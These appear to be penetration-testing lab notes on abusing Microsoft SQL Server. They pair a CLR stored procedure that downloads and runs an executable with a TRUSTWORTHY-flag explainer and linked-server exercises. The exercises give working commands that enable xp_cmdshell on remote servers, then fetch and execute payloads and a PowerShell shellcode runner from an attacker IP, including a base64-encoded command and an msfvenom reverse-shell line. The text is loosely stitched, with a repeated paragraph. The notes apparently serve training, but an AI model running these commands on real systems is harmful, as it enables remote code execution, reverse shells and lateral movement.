            process.StartInfo.RedirectStandardOutput = true;
            process.Start();

            // Capture and display the output from the process (if needed)
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            SqlContext.Pipe.Send(output);
        }
        catch (Exception ex)
        {
            SqlContext.Pipe.Send("Error: " + ex.Message);
        }
    }
}
```

#### **3. Compile the C# Code into a DLL**

You can compile the C# code using Visual Studio or the .NET CLI.

**Using the .NET CLI:**

```bash
csc /target:library /out:FileDownloader.dll FileDownloader.cs
```

This will generate a `FileDownloader.dll` file.

#### **4. Deploy the Assembly to SQL Server**

After compiling the C# code into a DLL, you need to deploy it to SQL Server.

```sql
-- Enable CLR (if not done already)
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;

-- Create the assembly in SQL Server
CREATE ASSEMBLY FileDownloader 
FROM 'C:\Path\To\Your\FileDownloader.dll' 
WITH PERMISSION_SET = UNSAFE;

-- Create the stored procedure
CREATE PROCEDURE DownloadAndRun
    @url NVARCHAR(4000),
    @filePath NVARCHAR(4000)
AS EXTERNAL NAME FileDownloader.FileDownloader.DownloadAndRun;
GO
```

Make sure to replace `'C:\Path\To\Your\FileDownloader.dll'` with the actual path to your DLL.

**Note**: The assembly is created with `PERMISSION_SET = UNSAFE` because the code interacts with the file system and executes external processes, which requires elevated permissions.

#### **5. Execute the CLR Stored Procedure**

Now, you can execute the `DownloadAndRun` stored procedure to download the file from the specified URL and execute it:

```sql
DECLARE @url NVARCHAR(4000) = 'http://192.168.45.197:8000/http.exe';
DECLARE @filePath NVARCHAR(4000) = 'C:\Temp\http.exe';

EXEC DownloadAndRun @url, @filePath;
```

This command will download the file `http.exe` from `http://192.168.45.197:8000` and save it to `C:\Temp\http.exe`. It will then execute the file.

### **Security Considerations**

- **Permission Set**: Using `PERMISSION_SET = UNSAFE` is necessary for file I/O and process execution, but it comes with security risks. Ensure that your SQL Server environment is secure, and that only trusted assemblies are deployed.

- **SQL Server Service Account**: The SQL Server service account needs to have the appropriate permissions to write to the file system and execute files.

- **Network Security**: Ensure that the URL from which the file is being downloaded is from a trusted source, as executing arbitrary code from untrusted sources can compromise your SQL Server.

### **Conclusion**

This guide provides a basic implementation of downloading and running an executable file using SQL Server CLR integration. The CLR stored procedure handles both the download and execution steps, making it a powerful tool for tasks that need to interact with the operating system or external resources.

To download a file from a URL and execute it using SQL Server's CLR integration, you can create a CLR stored procedure in C#. This stored procedure will perform the following steps:

1. Download the file from the specified URL.
2. Save the file to a temporary location on the SQL Server machine.
3. Execute the downloaded file.

### **Query to Check the TRUSTWORTHY Flag**

You can run the following T-SQL query to check the `TRUSTWORTHY` status of a specific database:

```sql
SELECT name, is_trustworthy_on
FROM sys.databases
WHERE name = 'YourDatabaseName';
```

Replace `'YourDatabaseName'` with the name of the database you want to check.

### **Interpreting the Results**

- **`is_trustworthy_on` = 1**: The `TRUSTWORTHY` flag is set to `ON`.
- **`is_trustworthy_on` = 0**: The `TRUSTWORTHY` flag is set to `OFF`.

### **Example**

If you want to check if the `TRUSTWORTHY` flag is set for the database named `MyDatabase`:

```sql
SELECT name, is_trustworthy_on
FROM sys.databases
WHERE name = 'MyDatabase';
```

This will return:

```plaintext
name        is_trustworthy_on
----------- ----------------
MyDatabase  1  -- or 0, depending on the setting
```

### **Checking All Databases**

If you want to check the `TRUSTWORTHY` flag for all databases on the server, you can run:

```sql
SELECT name, is_trustworthy_on
FROM sys.databases;
```

### **How to Set or Unset the TRUSTWORTHY Flag**

If you need to change the `TRUSTWORTHY` setting, you can use the `ALTER DATABASE` command:

- **To set the `TRUSTWORTHY` flag to `ON`**:

  ```sql
  ALTER DATABASE YourDatabaseName SET TRUSTWORTHY ON;
  ```

- **To set the `TRUSTWORTHY` flag to `OFF`**:

  ```sql
  ALTER DATABASE YourDatabaseName SET TRUSTWORTHY OFF;
  ```

### **Important Considerations**

- **Security Implications**: Setting the `TRUSTWORTHY` flag to `ON` can have significant security implications. It allows certain types of potentially risky operations (like executing CLR code or impersonating server-level principals) that could escalate privileges if not carefully managed.
  
- **Default Setting**: By default, the `TRUSTWORTHY` setting is `OFF` for newly created databases.


### Linked Server Exercise

- *Note:* none b64 encoded powershell worked while the encoded didn't and threw errors
```sql
username
password
appsrv01.corp1.com
master
EXEC sp_linkedservers;
select myuser from openquery("dc01", 'select SYSTEM_USER as myuser');
EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT DC01
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT DC01
EXEC ('xp_cmdshell ''powershell -Command Invoke-Webrequest -Uri http://192.168.45.197:8000/tcp.exe -OutFile c:\\Windows\\Tasks\\tcp3.exe; Start-Process C:\Windows\Tasks\tcp3.exe''') AT DC01
EXEC ('EXEC sp_executesql N''EXEC xp_cmdshell ''''cmd.exe /c powershell.exe -ep bypass -enc SW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwOi8vMTkyLjE2OC40NS4xOTc6ODAwMC90Y3AuZXhlIC1PdXRGaWxlIEM6XFxXaW5kb3dzXFxUYXNrc1xcdGNwLmV4ZScKCg=='''';''') AT DC01
```

- this download and execute worked
- shellcode using `msfvenom -p windows/x64/custom/reverse_winhttp LHOST=192.168.45.197 LPORT=8888 LURI=what.woff -f powershell`
```sql
username
password
appsrv01.corp1.com
master
EXEC sp_linkedservers;
select myuser from openquery("dc01", 'select SYSTEM_USER as myuser');
EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT DC01
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT DC01
EXEC ('EXEC sp_executesql N''EXEC xp_cmdshell ''''dir c:\'''';''') AT DC01
EXEC ('xp_cmdshell ''powershell.exe -NoProfile -ExecutionPolicy Bypass IEX(New-Object Net.WebClient).downloadString(''''http://192.168.45.197:8000/shellcode-runner.ps1'''')'';') AT DC01
```

- EM (cmd execution)
```sql
username
password
appsrv01.corp1.com
master
EXEC sp_linkedservers;
select myuser from openquery("dc01", 'select SYSTEM_USER as myuser')
EXEC ('EXEC [dc01].master.dbo.sp_executesql N''EXEC sp_configure ''''show advanced options'''', 1; RECONFIGURE; EXEC sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;''')
DECLARE @cmd NVARCHAR(4000);SET @cmd = 'CREATE TABLE #CmdOutput (Output NVARCHAR(4000)); INSERT INTO #CmdOutput (Output) EXEC master..xp_cmdshell ''powershell.exe -Command "Get-ChildItem C:\ | ForEach-Object { $_.Name }"''; SELECT * FROM #CmdOutput;' EXEC [dc01].master.dbo.sp_executesql @cmd
```
- openquery `xp_cmdshell`
```sql
-- Enable advanced options
SELECT * 
FROM OPENQUERY([dc01], 
    'EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;');

-- Enable xp_cmdshell
SELECT * 
FROM OPENQUERY([dc01], 
    'EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;');
```

#### 15.3.2.1

2. code to try
```sql
EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT appserv01') AT dc01;
EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT appserv01') AT dc01;

EXEC ('EXEC (''xp_cmdshell ''''powershell.exe -NoProfile -ExecutionPolicy Bypass IEX(New-Object Net.WebClient).downloadString(''''http://192.168.45.197:8000/shellcode-runner.ps1'''')'''';'') AT appserv01') AT dc01;

```